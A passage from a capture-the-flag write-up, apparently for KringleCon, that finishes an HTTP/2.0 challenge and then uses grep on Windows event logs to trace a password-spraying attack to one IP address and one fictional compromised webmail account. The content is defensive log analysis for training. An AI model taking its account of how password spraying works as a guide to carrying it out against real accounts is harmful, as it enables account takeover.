<span style="color: rgb(211, 215, 207);"> 'MMMMM</span><span style="color: rgb(204, 0, 0);">O',,,,,;</span><span style="color: rgb(211, 215, 207);">WMMMM</span>M<span style="color: rgb(204, 0, 0);">0',,,,,;</span><span style="color: rgb(211, 215, 207);">WMMMM</span>M<span style="color: rgb(211, 215, 207);">K</span><span style="color: rgb(204, 0, 0);">',,,,,,</span><span style="color: rgb(78, 154, 6);">occcc</span><span style="color: rgb(196, 160, 0);">oOXXXXXXXXXXXXX</span><span style="color: rgb(204, 0, 0);">xx</span><span style="color: rgb(196, 160, 0);">XXXXXXXXXXX</span>.<span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);"> 'MMM</span>M<span style="color: rgb(211, 215, 207);">N</span><span style="color: rgb(204, 0, 0);">;,,,,,'0</span>M<span style="color: rgb(211, 215, 207);">MMMMW</span><span style="color: rgb(204, 0, 0);">;,,,,,'O</span><span style="color: rgb(211, 215, 207);">MMMMM</span>W<span style="color: rgb(204, 0, 0);">:,,,,,'k</span><span style="color: rgb(78, 154, 6);">xcccc</span><span style="color: rgb(196, 160, 0);">0XXXXXXXXXXXXXX</span><span style="color: rgb(204, 0, 0);">xx0</span><span style="color: rgb(196, 160, 0);">KKKK</span><span style="color: rgb(204, 0, 0);">K000</span><span style="color: rgb(196, 160, 0);">d</span>; <span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);"> 'MMM</span>M<span style="color: rgb(204, 0, 0);">l,,,,,,o</span>M<span style="color: rgb(211, 215, 207);">MMMM</span>M<span style="color: rgb(204, 0, 0);">o,,,,,,l</span>M<span style="color: rgb(211, 215, 207);">MMMM</span>M<span style="color: rgb(204, 0, 0);">d,,,,,,c</span>M<span style="color: rgb(78, 154, 6);">xcccc</span><span style="color: rgb(196, 160, 0);">0XXXXXXXXXXXXXX</span><span style="color: rgb(204, 0, 0);">OdkO000K</span><span style="color: rgb(196, 160, 0);">KKKK0x</span>.<span style="color: rgb(211, 215, 207);"> </span>
<span style="color: rgb(211, 215, 207);"> 'MM</span>M<span style="color: rgb(204, 0, 0);">O',,,,,;</span>W<span style="color: rgb(211, 215, 207);">MMMM</span>M<span style="color: rgb(204, 0, 0);">O',,,,,,</span><span style="color: rgb(211, 215, 207);">NMMMM</span>M<span style="color: rgb(211, 215, 207);">K</span><span style="color: rgb(204, 0, 0);">',,,,,,</span><span style="color: rgb(211, 215, 207);">X</span>M<span style="color: rgb(78, 154, 6);">xcccc</span><span style="color: rgb(196, 160, 0);">0XXXXXXXXXXXXXX</span><span style="color: rgb(204, 0, 0);">xx</span><span style="color: rgb(196, 160, 0);">XXXXXXXXXXXX:</span><span style="color: rgb(211, 215, 207);"> </span>
<span style="color: rgb(211, 215, 207);"> 'MMN</span><span style="color: rgb(204, 0, 0);">,,,,,,'O</span><span style="color: rgb(211, 215, 207);">MMMMMW</span><span style="color: rgb(204, 0, 0);">;,,,,,'k</span>M<span style="color: rgb(211, 215, 207);">MMMM</span>W<span style="color: rgb(204, 0, 0);">;,,,,,'x</span>MM<span style="color: rgb(78, 154, 6);">xcccc</span><span style="color: rgb(196, 160, 0);">0XXXXXXXXXXXXK</span><span style="color: rgb(204, 0, 0);">kkxxO00000OOx</span>;. <span style="color: rgb(211, 215, 207);"> </span>
<span style="color: rgb(211, 215, 207);"> 'M</span>M<span style="color: rgb(204, 0, 0);">l,,,,,,l</span>M<span style="color: rgb(211, 215, 207);">MMMM</span>M<span style="color: rgb(204, 0, 0);">o,,,,,,c</span>M<span style="color: rgb(211, 215, 207);">MMMMM</span><span style="color: rgb(204, 0, 0);">d,,,,,,:</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(78, 154, 6);">xcccc</span><span style="color: rgb(196, 160, 0);">0XXXXXXXXXX</span><span style="color: rgb(204, 0, 0);">KOOkd0</span><span style="color: rgb(196, 160, 0);">XXXXXXXXXXO</span>.<span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);"> 'M</span><span style="color: rgb(204, 0, 0);">0',,,,,;</span>W<span style="color: rgb(211, 215, 207);">MMMMM</span><span style="color: rgb(204, 0, 0);">0',,,,,,</span><span style="color: rgb(211, 215, 207);">NMMMMMK</span><span style="color: rgb(204, 0, 0);">,,,,,,,</span><span style="color: rgb(211, 215, 207);">XMM</span>M<span style="color: rgb(78, 154, 6);">xcccc</span><span style="color: rgb(196, 160, 0);">kXXXXXXXXXX</span><span style="color: rgb(204, 0, 0);">0</span><span style="color: rgb(196, 160, 0);">KX</span><span style="color: rgb(204, 0, 0);">KxOK</span><span style="color: rgb(196, 160, 0);">KKXXXXXXXk</span>.<span style="color: rgb(211, 215, 207);">  </span>
<span style="color: rgb(211, 215, 207);"> .</span>c<span style="color: rgb(204, 0, 0);">.......</span><span style="color: rgb(211, 215, 207);">'cccccc</span><span style="color: rgb(204, 0, 0);">.......'</span><span style="color: rgb(211, 215, 207);">cccccc</span><span style="color: rgb(204, 0, 0);">.......'</span>c<span style="color: rgb(211, 215, 207);">ccc</span><span style="color: rgb(78, 154, 6);">:ccc:</span> .<span style="color: rgb(196, 160, 0);">c0XXXXXXXXXX</span><span style="color: rgb(204, 0, 0);">0xO0000000O</span><span style="color: rgb(196, 160, 0);">c</span> <span style="color: rgb(211, 215, 207);">    </span>
<span style="color: rgb(211, 215, 207);">                                           </span>     <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);"> </span> ;<span style="color: rgb(196, 160, 0);">xKXXXXXXX</span><span style="color: rgb(204, 0, 0);">0x</span><span style="color: rgb(196, 160, 0);">KXXXXXXXXK</span>.<span style="color: rgb(211, 215, 207);">    </span>
<span style="color: rgb(211, 215, 207);">                                                      </span> ..,:<span style="color: rgb(196, 160, 0);">ccll</span><span style="color: rgb(204, 0, 0);">c:ccc</span><span style="color: rgb(196, 160, 0);">ccc</span>:' <span style="color: rgb(211, 215, 207);"> </span> <span style="color: rgb(211, 215, 207);">   </span>
<span style="color: rgb(211, 215, 207);">                                                                               </span>

Unencrypted 2.0? He's such a silly guy.
That's the kind of stunt that makes my OWASP friends all cry.
Truth be told: most major sites are speaking 2.0;
TLS connections are in place when they do so.

-Holly Evergreen
&lt;p&gt;Congratulations! You've won and have successfully completed this challenge.
&lt;p&gt;POSTing data in HTTP/2.0.

 &lt;/body&gt;
&lt;/html&gt;
* Curl_http_done: called premature == 0
* Connection #0 to host localhost left intact
elf@776172646f67:~$</pre>
        <p>And with that we've solved the challenge.</p>
      </div>
      <div class="border rounded p-2 m-2">
        <div class="dropdown">
          <button class="btn btn-dark dropdown-toggle mb-1" type="button" id="dropdownMenuButton" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
            <a id="termSprayDetect"></a>Yule Log Analysis
          </button>
          <div class="dropdown-menu" aria-labelledby="dropdownMenuButton">
            <a class="dropdown-item" href="#hntPepper">Pepper Minstix Hints</a>
            <a class="dropdown-item" href="#npcPepper">Pepper Minstix</a>
            <a class="dropdown-item" href="#obj6">Objective 6</a>
          </div>
        </div>

        <div id="divSprayDetect" style="display: inline-block" onclick='if (!$(this).html().includes("iframe")) {$(this).html(atob("PGlmcmFtZSBzdHlsZT0ibWluLXdpZHRoOiA4MDBweDsgbWF4LXdpZHRoOiAxMDAwcHg7IGhlaWdodDogODAwcHg7IGJvcmRlcjogbm9uZTsiIHNyYz0iaHR0cHM6Ly9kb2NrZXIua3JpbmdsZWNvbi5jb20vP2NoYWxsZW5nZT1zcHJheS1kZXRlY3QiPjwvaWZyYW1lPjxwPjxhIGhyZWY9IiMhIiBjbGFzcz0iYnRuIGJ0bi1pbmZvIiAgb25tb3VzZXVwPSIkKCcjZGl2U3ByYXlEZXRlY3QnKS5odG1sKGF0b2IoJ1BHRWdhSEpsWmowaUl5RWlJR05zWVhOelBTSmlkRzRnWW5SdUxXbHVabThpUGtOc2FXTnJJR2hsY21VZ2RHOGdQR0krYjNCbGJqd3ZZajRnV1hWc1pTQk1iMmNnUVc1aGJIbHphWE1nVkdWeWJXbHVZV3c4TDJFKycpKSI+Q2xpY2sgaGVyZSB0byA8Yj5jbG9zZTwvYj4gWXVsZSBMb2cgQW5hbHlzaXMgVGVybWluYWw8L2E+PC9wPg=="))}'>
          <a href="#!" class="btn btn-info">Click here to <b>open</b> Yule Log Analysis Terminal</a>
        </div>

        <hr class="my-4">
        <p>Opening the challege we get this screen:</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
<span style="color: rgb(211, 215, 207);">                                                                                </span>
<span style="color: rgb(211, 215, 207);">                             </span>.<span style="color: rgb(211, 215, 207);">;:</span><span style="color: rgb(204, 0, 0);">cccc</span><span style="color: rgb(211, 215, 207);">kkxdc;</span>.  <span style="color: rgb(211, 215, 207);">                                   </span>
<span style="color: rgb(211, 215, 207);">                         .o0</span><span style="color: rgb(204, 0, 0);">xc;,,,,,X</span><span style="color: rgb(211, 215, 207);">MMMM</span>M<span style="color: rgb(204, 0, 0);">kc:,</span><span style="color: rgb(211, 215, 207);">.                                 </span>
<span style="color: rgb(211, 215, 207);">                       </span>lX<span style="color: rgb(211, 215, 207);">MM</span>M<span style="color: rgb(204, 0, 0);">X;,,,,,,X</span><span style="color: rgb(211, 215, 207);">MMM</span>M<span style="color: rgb(204, 0, 0);">K,,coddccl</span>O<span style="color: rgb(211, 215, 207);">kxoc,</span>. <span style="color: rgb(211, 215, 207);">                     </span>
<span style="color: rgb(211, 215, 207);">                    </span> <span style="color: rgb(211, 215, 207);">l</span><span style="color: rgb(204, 0, 0);">k:oN</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(204, 0, 0);">X;,,,,,X</span><span style="color: rgb(211, 215, 207);">MMW</span>N<span style="color: rgb(204, 0, 0);">00o:,,,,,:</span>M<span style="color: rgb(211, 215, 207);">MMMMM</span><span style="color: rgb(204, 0, 0);">oc;'</span><span style="color: rgb(211, 215, 207);">                   </span>
<span style="color: rgb(211, 215, 207);">                   </span>.<span style="color: rgb(204, 0, 0);">0l,,,,dN</span>MM<span style="color: rgb(204, 0, 0);">X;,,,,X</span>NNW<span style="color: rgb(211, 215, 207);">MM</span>M<span style="color: rgb(204, 0, 0);">k,,,,,,:</span>M<span style="color: rgb(211, 215, 207);">MMM</span>M<span style="color: rgb(204, 0, 0);">x,,,,:;</span><span style="color: rgb(211, 215, 207);">.</span> <span style="color: rgb(211, 215, 207);">               </span>
<span style="color: rgb(211, 215, 207);">                  </span>.<span style="color: rgb(204, 0, 0);">K;,,,,,,,x</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(204, 0, 0);">X;,,;Kx:k</span><span style="color: rgb(211, 215, 207);">WMM</span>M<span style="color: rgb(204, 0, 0);">k,,,,,:</span>M<span style="color: rgb(211, 215, 207);">MMM</span><span style="color: rgb(204, 0, 0);">0,,,,,,,:k</span><span style="color: rgb(211, 215, 207);">'              </span>
<span style="color: rgb(211, 215, 207);">                 .</span>X<span style="color: rgb(204, 0, 0);">klooooddolck</span><span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">N:l0:,,,;k</span><span style="color: rgb(211, 215, 207);">W</span>MM<span style="color: rgb(204, 0, 0);">O,,,,:</span>M<span style="color: rgb(211, 215, 207);">MM</span><span style="color: rgb(204, 0, 0);">N;,,,,,cO</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">Md             </span>
<span style="color: rgb(211, 215, 207);">               </span>;<span style="color: rgb(211, 215, 207);">o</span><span style="color: rgb(204, 0, 0);">ooc;,,,c</span>M<span style="color: rgb(211, 215, 207);">MM</span>MMM<span style="color: rgb(204, 0, 0);">xkO0,,,,,,,:O</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(204, 0, 0);">0,,,:</span>M<span style="color: rgb(211, 215, 207);">MW</span><span style="color: rgb(204, 0, 0);">c,,,,lK</span>MM<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">Ko</span> <span style="color: rgb(211, 215, 207);">           </span>
<span style="color: rgb(211, 215, 207);">            ;OM</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">l,,,,,,c</span>M<span style="color: rgb(211, 215, 207);">MMM</span>M<span style="color: rgb(204, 0, 0);">O,,,:cc,,,,,,,:0</span>M<span style="color: rgb(204, 0, 0);">0,,:</span>MM<span style="color: rgb(204, 0, 0);">d,,,oX</span>MM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">Kxc,,,c</span><span style="color: rgb(211, 215, 207);">           </span>
<span style="color: rgb(211, 215, 207);">          </span>c<span style="color: rgb(204, 0, 0);">OdX</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">l,,,,,c</span>M<span style="color: rgb(211, 215, 207);">MM</span>M<span style="color: rgb(204, 0, 0);">X,,,,,,,:xxo:,,,,cK0,:</span>M<span style="color: rgb(204, 0, 0);">O,;x</span><span style="color: rgb(211, 215, 207);">NW</span><span style="color: rgb(204, 0, 0);">Kxc,,,,,,,:</span><span style="color: rgb(211, 215, 207);">.          </span>
<span style="color: rgb(211, 215, 207);">        </span>.<span style="color: rgb(204, 0, 0);">0l,,,oN</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">l,,,,c</span>M<span style="color: rgb(211, 215, 207);">MMW</span><span style="color: rgb(204, 0, 0);">:,,,,,,dX</span><span style="color: rgb(211, 215, 207);">MW</span>N<span style="color: rgb(211, 215, 207);">MW</span><span style="color: rgb(204, 0, 0);">XOdc;lxcX:xOxc,,,,,,,,,,,,:</span><span style="color: rgb(211, 215, 207);">          </span>
<span style="color: rgb(211, 215, 207);">       </span>,<span style="color: rgb(204, 0, 0);">0;,,,,,,dN</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">o,,,c</span>MM<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(204, 0, 0);">l,,,,;x</span><span style="color: rgb(211, 215, 207);">N</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">MW</span><span style="color: rgb(204, 0, 0);">0kkkkkkddxdddxxxxxxxxxxxxxxxo</span><span style="color: rgb(211, 215, 207);">          </span>
<span style="color: rgb(211, 215, 207);">      </span>.<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">l,,,,,,,,,d</span><span style="color: rgb(211, 215, 207);">WM</span><span style="color: rgb(204, 0, 0);">o,,c</span>MM<span style="color: rgb(204, 0, 0);">x,,,:O</span><span style="color: rgb(211, 215, 207);">W</span>MM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">0xc,:c,,:dOkcK:kc:ok0N</span><span style="color: rgb(211, 215, 207);">MMMMMMMMMMd          </span>
<span style="color: rgb(211, 215, 207);">      KM</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">XOdl;,,,,;x</span><span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">d,c</span>M<span style="color: rgb(204, 0, 0);">0,,l0</span><span style="color: rgb(211, 215, 207);">MW</span><span style="color: rgb(204, 0, 0);">0dc,,,,,,lk</span><span style="color: rgb(211, 215, 207);">WW</span><span style="color: rgb(204, 0, 0);">k:,O</span><span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">,:XO:,,,;ldOX</span><span style="color: rgb(211, 215, 207);">W</span>MM<span style="color: rgb(211, 215, 207);">MM'          </span>
<span style="color: rgb(211, 215, 207);">     'MMMMMMM</span>MM<span style="color: rgb(204, 0, 0);">N0ko:,;kdcN;o00dc,,,,,,,,,,,0x;,,o</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">,,;X</span><span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">k;,,,,,,,:ok</span><span style="color: rgb(211, 215, 207);">k           </span>
<span style="color: rgb(211, 215, 207);">     </span>c<span style="color: rgb(204, 0, 0);">NKKKKKKKKKKKKKKkoodxxdccccccccccccccco,,,:</span><span style="color: rgb(211, 215, 207);">WMW</span><span style="color: rgb(204, 0, 0);">,,,;X</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">k;,,,,,,,l</span><span style="color: rgb(211, 215, 207);">            </span>
<span style="color: rgb(211, 215, 207);">     </span>:<span style="color: rgb(204, 0, 0);">x,,,,,,,,,,,,,cdkoOldldOK</span><span style="color: rgb(211, 215, 207);">W</span>MM<span style="color: rgb(211, 215, 207);">MMMMMMMMM</span><span style="color: rgb(204, 0, 0);">x,,,X</span>M<span style="color: rgb(211, 215, 207);">MW</span><span style="color: rgb(204, 0, 0);">,,,,;X</span>MM<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">x,,,,;c</span><span style="color: rgb(211, 215, 207);">             </span>
<span style="color: rgb(211, 215, 207);">     .</span><span style="color: rgb(204, 0, 0);">K,,,,,,,,,cd0</span><span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">Kl,x</span><span style="color: rgb(211, 215, 207);">N</span><span style="color: rgb(204, 0, 0);">,oXo,,,:ok0N</span><span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">MMM</span>M<span style="color: rgb(204, 0, 0);">c,,O</span>M<span style="color: rgb(211, 215, 207);">MMW</span><span style="color: rgb(204, 0, 0);">,,,,,;K</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">N</span><span style="color: rgb(204, 0, 0);">d;l</span><span style="color: rgb(211, 215, 207);">'              </span>
<span style="color: rgb(211, 215, 207);">      d</span><span style="color: rgb(204, 0, 0);">l,,,,cx0</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(204, 0, 0);">0c,,l</span><span style="color: rgb(211, 215, 207);">MN</span><span style="color: rgb(204, 0, 0);">,,o</span><span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(204, 0, 0);">Xl,,,,,,;ldOX0',d</span>M<span style="color: rgb(211, 215, 207);">MMMW</span><span style="color: rgb(204, 0, 0);">,,,,,,;K</span><span style="color: rgb(211, 215, 207);">MMM</span>K<span style="color: rgb(211, 215, 207);">;                </span>
<span style="color: rgb(211, 215, 207);">      </span> <span style="color: rgb(211, 215, 207);">O</span><span style="color: rgb(204, 0, 0);">oxK</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(211, 215, 207);">M</span>M<span style="color: rgb(211, 215, 207);">W</span><span style="color: rgb(204, 0, 0);">k:,,,;</span><span style="color: rgb(211, 215, 207);">NMN</span><span style="color: rgb(204, 0, 0);">,,,l</span><span style="color: rgb(211, 215, 207);">W</span>M<span style="color: rgb(204, 0, 0);">Kc,,,,,,,,ldcl</span><span style="color: rgb(211, 215, 207);">WMMMMW</span><span style="color: rgb(204, 0, 0);">,,,,,,:o</span><span style="color: rgb(211, 215, 207);">Ol.                  </span>
<span style="color: rgb(211, 215, 207);">        </span>O<span style="color: rgb(211, 215, 207);">MMMM</span><span style="color: rgb(204, 0, 0);">Nx;,,,,,K</span>M<span style="color: rgb(211, 215, 207);">MN</span><span style="color: rgb(204, 0, 0);">,,,,l</span><span style="color: rgb(211, 215, 207);">W</span>MM<span style="color: rgb(204, 0, 0);">0c,,,,,l</span><span style="color: rgb(211, 215, 207);">.</span> .,c<span style="color: rgb(211, 215, 207);">dkO00</span><span style="color: rgb(204, 0, 0);">ccc:;</span><span style="color: rgb(211, 215, 207);">,</span>. <span style="color: rgb(211, 215, 207);">                     </span>
<span style="color: rgb(211, 215, 207);">         c</span>W<span style="color: rgb(204, 0, 0);">Xo,,,,,,,k</span>M<span style="color: rgb(211, 215, 207);">MMN</span><span style="color: rgb(204, 0, 0);">,,,,,c</span><span style="color: rgb(211, 215, 207);">WM</span>M<span style="color: rgb(211, 215, 207);">M</span><span style="color: rgb(204, 0, 0);">0:,c:</span> <span style="color: rgb(211, 215, 207);">                                       </span>
<span style="color: rgb(211, 215, 207);">          </span>.<span style="color: rgb(211, 215, 207);">K</span><span style="color: rgb(204, 0, 0);">c,,,,,,:</span>M<span style="color: rgb(211, 215, 207);">MMMN</span><span style="color: rgb(204, 0, 0);">,,,,,,d</span>M<span style="color: rgb(211, 215, 207);">MMMW</span><span style="color: rgb(204, 0, 0);">k</span><span style="color: rgb(211, 215, 207);">'                                         </span>

I am Pepper Minstix, and I'm looking for your help.
Bad guys have us tangled up in pepperminty kelp!
"Password spraying" is to blame for this our grinchly fate.
Should we blame our password policies which users hate?

Here you'll find a web log filled with failure and success.
One successful login there requires your redress.
Can you help us figure out which user was attacked?
Tell us who fell victim, and please handle this with tact...

  Submit the compromised webmail username to
  runtoanswer to complete this challenge.
elf@776172646f67:~$</pre>
        <p>We need to find a user account that was compromised through password spraying. <a href="#hntPepper">Pepper Minstix</a> does give us one useful clue, a link for <a href="https://securityweekly.com/2017/07/21/tsw11/">Password Spraying with MailSniper.ps1</a>.</p>
        <p>The concept behind password spraying is that within a short amount of time a small amount of password attempts are tried across multiple accounts instead of multiple password tries on a single account. This prevents accounts from being locked out possibly creating alerts. What we want to look for are a large amount of password attacks against multiple accounts. For Windows event logs that means we want to look at Event ID '4625', failed logins. First, let's dump all event logs into a file in text xml format for faster grepping instead of constantly running the parsing program and grepping against the results.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ python evtx_dump.py ho-ho-no.evtx > events</pre>
        <p>Now let's dump only the '4625' event logs, we can do this using <code>grep</code> to include lines below and above our match. With some experimentation the best result is:</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ grep -B1 -A36 ">4625<" events > 4625.log</pre>
        <p>If we look at the system times of the failed logins we can start to see a bulk of failures starting on September 10th at 13:04:33 and running until 13:05:39</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ grep SystemTime 4625.log
&lt;TimeCreated <span style="color: rgb(239, 41, 41); font-weight: bold;">SystemTime</span>="2018-09-10 12:41:50.900736"&gt;&lt;/TimeCreated&gt;
&lt;TimeCreated <span style="color: rgb(239, 41, 41); font-weight: bold;">SystemTime</span>="2018-09-10 12:54:56.034510"&gt;&lt;/TimeCreated&gt;
&lt;TimeCreated <span style="color: rgb(239, 41, 41); font-weight: bold;">SystemTime</span>="2018-09-10 13:03:33.271959"&gt;&lt;/TimeCreated&gt;
&lt;TimeCreated <span style="color: rgb(239, 41, 41); font-weight: bold;">SystemTime</span>="2018-09-10 13:03:34.075348"&gt;&lt;/TimeCreated&gt;
&lt;TimeCreated <span style="color: rgb(239, 41, 41); font-weight: bold;">SystemTime</span>="2018-09-10 13:03:34.660316"&gt;&lt;/TimeCreated&gt;
&lt;TimeCreated <span style="color: rgb(239, 41, 41); font-weight: bold;">SystemTime</span>="2018-09-10 13:03:35.204905"&gt;&lt;/TimeCreated&gt;
&lt;TimeCreated <span style="color: rgb(239, 41, 41); font-weight: bold;">SystemTime</span>="2018-09-10 13:03:35.766270"&gt;&lt;/TimeCreated&gt;
&lt;TimeCreated <span style="color: rgb(239, 41, 41); font-weight: bold;">SystemTime</span>="2018-09-10 13:03:36.352919"&gt;&lt;/TimeCreated&gt;
&lt;TimeCreated <span style="color: rgb(239, 41, 41); font-weight: bold;">SystemTime</span>="2018-09-10 13:03:36.907885"&gt;&lt;/TimeCreated&gt;
... [extra rows stripped] ...
&lt;TimeCreated <span style="color: rgb(239, 41, 41); font-weight: bold;">SystemTime</span>="2018-09-10 13:05:37.695000"&gt;&lt;/TimeCreated&gt;
&lt;TimeCreated <span style="color: rgb(239, 41, 41); font-weight: bold;">SystemTime</span>="2018-09-10 13:05:38.474575"&gt;&lt;/TimeCreated&gt;
&lt;TimeCreated <span style="color: rgb(239, 41, 41); font-weight: bold;">SystemTime</span>="2018-09-10 13:05:39.123190"&gt;&lt;/TimeCreated&gt;</pre>
        <p>If we look at IP Addresses for all these failures we see that all but one is from the IP address 172.31.254.101.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ grep IpAddress 4625.log | sort | uniq -c
      1 &lt;Data Name="IpAddress"&gt;10.158.210.210&lt;/Data&gt;
    211 &lt;Data Name="IpAddress"&gt;172.31.254.101&lt;/Data&gt;</pre>
        <p>If we take a look at the unique login names, we can see that this pretty much looks like a password spray attempt. There are 212 failures in the log, 211 are unique.</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ grep TargetUserName 4625.log | wc -l
212
elf@776172646f67:~$ grep TargetUserName 4625.log | sort | uniq -c | sort -n| wc -l
211</pre>
        <p>Now that we've identified the malicious IP address, we can see if there was a successful login from that IP. First let's dump the 4624 events then search the results for 172.31.254.101</p>
        <pre class="text-monospace bg-dark text-light p-2" style="white-space: pre-wrap">
elf@776172646f67:~$ grep -A 42 -B1 '&gt;4624&lt;' events &gt; 4624.log
elf@776172646f67:~$ grep -B33 -A 10 172.31.254.101 4624.log
&lt;Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"&gt;&lt;System&gt;&lt;Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"&gt;&lt;/Provider&gt;
&lt;EventID Qualifiers=""&gt;4624&lt;/EventID&gt;
&lt;Version&gt;2&lt;/Version&gt;
&lt;Level&gt;0&lt;/Level&gt;
&lt;Task&gt;12544&lt;/Task&gt;
&lt;Opcode&gt;0&lt;/Opcode&gt;
&lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt;
&lt;TimeCreated SystemTime="2018-09-10 13:05:03.702278"&gt;&lt;/TimeCreated&gt;
&lt;EventRecordID&gt;240171&lt;/EventRecordID&gt;
&lt;Correlation ActivityID="{71a9b66f-4900-0001-a8b6-a9710049d401}" RelatedActivityID=""&gt;&lt;/Correlation&gt;
&lt;Execution ProcessID="664" ThreadID="15576"&gt;&lt;/Execution&gt;
&lt;Channel&gt;Security&lt;/Channel&gt;
&lt;Computer&gt;WIN-KCON-EXCH16.EM.KRINGLECON.COM&lt;/Computer&gt;
&lt;Security UserID=""&gt;&lt;/Security&gt;
&lt;/System&gt;
&lt;EventData&gt;&lt;Data Name="SubjectUserSid"&gt;S-1-5-18&lt;/Data&gt;
&lt;Data Name="SubjectUserName"&gt;WIN-KCON-EXCH16$&lt;/Data&gt;
&lt;Data Name="SubjectDomainName"&gt;EM.KRINGLECON&lt;/Data&gt;
&lt;Data Name="SubjectLogonId"&gt;0x00000000000003e7&lt;/Data&gt;
&lt;Data Name="TargetUserSid"&gt;S-1-5-21-25059752-1411454016-2901770228-1156&lt;/Data&gt;
&lt;Data Name="TargetUserName"&gt;<span style="color: rgb(255, 64, 64); font-weight: bold;">minty.candycane</span>&lt;/Data&gt;
&lt;Data Name="TargetDomainName"&gt;EM.KRINGLECON&lt;/Data&gt;
&lt;Data Name="TargetLogonId"&gt;0x000000000114a4fe&lt;/Data&gt;
&lt;Data Name="LogonType"&gt;8&lt;/Data&gt;
&lt;Data Name="LogonProcessName"&gt;Advapi  &lt;/Data&gt;
&lt;Data Name="AuthenticationPackageName"&gt;Negotiate&lt;/Data&gt;
&lt;Data Name="WorkstationName"&gt;WIN-KCON-EXCH16&lt;/Data&gt;
&lt;Data Name="LogonGuid"&gt;{d1a830e3-d804-588d-aea1-48b8610c3cc1}&lt;/Data&gt;
&lt;Data Name="TransmittedServices"&gt;-&lt;/Data&gt;
&lt;Data Name="LmPackageName"&gt;-&lt;/Data&gt;
&lt;Data Name="KeyLength"&gt;0&lt;/Data&gt;
&lt;Data Name="ProcessId"&gt;0x00000000000019f0&lt;/Data&gt;
&lt;Data Name="ProcessName"&gt;C:\Windows\System32\inetsrv\w3wp.exe&lt;/Data&gt;
&lt;Data Name="IpAddress"&gt;172.31.254.101&lt;/Data&gt;
&lt;Data Name="IpPort"&gt;38283&lt;/Data&gt;
&lt;Data Name="ImpersonationLevel"&gt;%%1833&lt;/Data&gt;
&lt;Data Name="RestrictedAdminMode"&gt;-&lt;/Data&gt;
&lt;Data Name="TargetOutboundUserName"&gt;-&lt;/Data&gt;
&lt;Data Name="TargetOutboundDomainName"&gt;-&lt;/Data&gt;
&lt;Data Name="VirtualAccount"&gt;%%1843&lt;/Data&gt;
&lt;Data Name="TargetLinkedLogonId"&gt;0x0000000000000000&lt;/Data&gt;
&lt;Data Name="ElevatedToken"&gt;%%1842&lt;/Data&gt;
&lt;/EventData&gt;
&lt;/Event&gt;
--
&lt;Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"&gt;&lt;System&gt;&lt;Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"&gt;&lt;/Provider&gt;
&lt;EventID Qualifiers=""&gt;4624&lt;/EventID&gt;
&lt;Version&gt;2&lt;/Version&gt;
&lt;Level&gt;0&lt;/Level&gt;
&lt;Task&gt;12544&lt;/Task&gt;
&lt;Opcode&gt;0&lt;/Opcode&gt;
&lt;Keywords&gt;0x8020000000000000&lt;/Keywords&gt;
&lt;TimeCreated SystemTime="2018-09-10 13:07:02.556292"&gt;&lt;/TimeCreated&gt;
&lt;EventRecordID&gt;240573&lt;/EventRecordID&gt;
